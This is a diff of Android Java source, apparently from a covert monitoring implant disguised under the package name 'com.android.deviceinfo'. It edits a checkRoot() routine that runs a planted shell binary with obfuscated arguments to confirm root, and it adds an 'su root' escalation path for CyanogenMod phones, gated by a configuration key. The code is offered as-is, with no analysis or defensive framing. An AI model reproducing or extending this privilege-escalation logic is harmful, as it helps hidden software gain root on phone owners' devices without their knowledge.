@@ -21,9 +21,11 @@ import org.xml.sax.SAXException;
 
 import android.content.Context;
 
+import com.android.deviceinfo.Root;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.Configuration;
+import com.android.deviceinfo.crypto.Keys;
 import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.Execute;
@@ -128,22 +130,23 @@ public class PackageInfo {
 	static public boolean checkRoot() { //$NON-NLS-1$
 		boolean isRoot = false;
 
+		
 		try {
 			// Verifichiamo di essere root
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (checkRoot), " + Configuration.shellFile);
+				Check.log(TAG + " (checkRoot), " + Configuration.shellFileBase);
 			}
-			final AutoFile file = new AutoFile(Configuration.shellFile);
+			final AutoFile file = new AutoFile(Configuration.shellFileBase);
 
 			if (file.exists() && file.canRead()) {
-
-				// 32_14= air
-				//Execute.executeRoot("touch /sdcard/air");
 				
-				//final String stdout = Execute.executeScript(Configuration.shellFile + M.e(" qzx whoami"));
-				final ExecuteResult p = Execute.execute(Configuration.shellFile + M.e(" qzx whoami"));
+				if(Root.checkCyanogenmod() && Keys.self().wantsPrivilege()){
+					Configuration.shellFile = M.e("su root ") + Configuration.shellFileBase;
+				}
+
+				final ExecuteResult p = Execute.execute(Configuration.shellFile + M.e(" qzx id"));
 				String stdout = p.getStdout();
-				if (stdout.startsWith("root")) {
+				if (stdout.startsWith("uid=0")) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (checkRoot): isRoot YEAHHHHH"); //$NON-NLS-1$ //$NON-NLS-2$
 					}
